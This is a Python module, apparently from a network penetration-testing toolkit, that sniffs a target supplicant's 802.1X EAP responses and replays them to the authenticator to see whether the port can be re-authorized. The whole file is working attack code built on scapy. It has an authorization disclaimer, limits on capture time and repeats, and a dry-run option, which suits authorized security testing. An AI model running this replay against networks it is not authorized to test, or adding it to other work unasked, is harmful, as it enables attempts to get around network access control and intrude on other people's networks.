"""EAPOL replay: capture a supplicant's EAP responses and send them again later.

An 802.1X exchange is a series of EAP frames between the supplicant and the authenticator.
A correct authenticator accepts an EAP response only as the answer to the request it just sent,
for the current session, so a response captured from an earlier exchange should not move the
port to the authorized state again. This module captures the EAP responses one supplicant sends
during a window, then sends them again the number of times the operator gives.

The effect to measure is whether the authenticator reacts to the replayed responses. The
module does not complete any EAP exchange and does not compute new EAP responses.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
import time
from collections.abc import Callable, Iterable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import AsyncSniffer, Ether, sendp
from scapy.layers.eap import EAP
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

EAP_RESPONSE = 2
MAX_CAPTURE_SECONDS = 300
MAX_REPEATS = 10


@dataclass(frozen=True)
class EapolReplayConfig:
    iface: str                          # attacker interface, on the segment with the authenticator
    victim_mac: str                     # the supplicant whose EAP responses are captured (required)
    capture_seconds: int = 10           # how long to capture before replaying
    repeats: int = 1                    # how many times to send each captured response
    dry_run: bool = False               # describe the run but do not capture or send

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.victim_mac)
        if not 1 <= self.capture_seconds <= MAX_CAPTURE_SECONDS:
            raise ValueError(f"Capture time must be between 1 and {MAX_CAPTURE_SECONDS} seconds.")
        if not 1 <= self.repeats <= MAX_REPEATS:
            raise ValueError(f"Repeats must be between 1 and {MAX_REPEATS}.")


@dataclass
class EapolReplayStats:
    captured: int = 0
    replayed: int = 0
    status: str = ""


def is_victim_response(packet: Packet, victim_mac: str) -> bool:
    """True for an EAP response sent by `victim_mac`."""
    return (
        packet.haslayer(EAP)
        and packet.haslayer(Ether)
        and packet[Ether].src.lower() == victim_mac.lower()
        and packet[EAP].code == EAP_RESPONSE
    )


def select_responses(packets: Iterable[Packet], victim_mac: str) -> list[Packet]:
    """The EAP responses from `victim_mac`, in the order they were captured."""
    return [packet for packet in packets if is_victim_response(packet, victim_mac)]


def capture_responses(
    iface: str,
    victim_mac: str,
    seconds: int,
    stop_event: threading.Event,
) -> list[Packet]:
    """Sniff `iface` in promiscuous mode for `seconds`, or until `stop_event`, and keep the victim's responses."""
    seen: list[Packet] = []
    sniffer = AsyncSniffer(
        iface=iface,
        promisc=True,
        lfilter=lambda p: is_victim_response(p, victim_mac),
        prn=seen.append,
        store=False,
    )
    sniffer.start()
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline and not stop_event.is_set():
        time.sleep(0.1)
    sniffer.stop()
    return list(seen)


def run_eapol_replay(
    config: EapolReplayConfig,
    stop_event: threading.Event,
    on_progress: Callable[[EapolReplayStats], None],
    capture: Callable[..., list[Packet]] | None = None,
    send: Callable[..., Any] | None = None,
) -> EapolReplayStats:
    """Capture the victim's EAP responses for `capture_seconds`, then send each one `repeats` times."""
    capture = capture or capture_responses
    send = send or sendp

    if config.dry_run:
        stats = EapolReplayStats(
            status=(
                f"Dry run: would capture EAP responses from {config.victim_mac} for {config.capture_seconds} s, "
                f"then send each one {config.repeats} time(s). Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = EapolReplayStats()
    captured = capture(config.iface, config.victim_mac, config.capture_seconds, stop_event)
    responses = select_responses(captured, config.victim_mac)
    stats.captured = len(responses)
    on_progress(replace(stats))
    for _ in range(config.repeats):
        for response in responses:
            if stop_event.is_set():
                return stats
            send(response, iface=config.iface, verbose=False)
            stats.replayed += 1
            on_progress(replace(stats))
    return stats
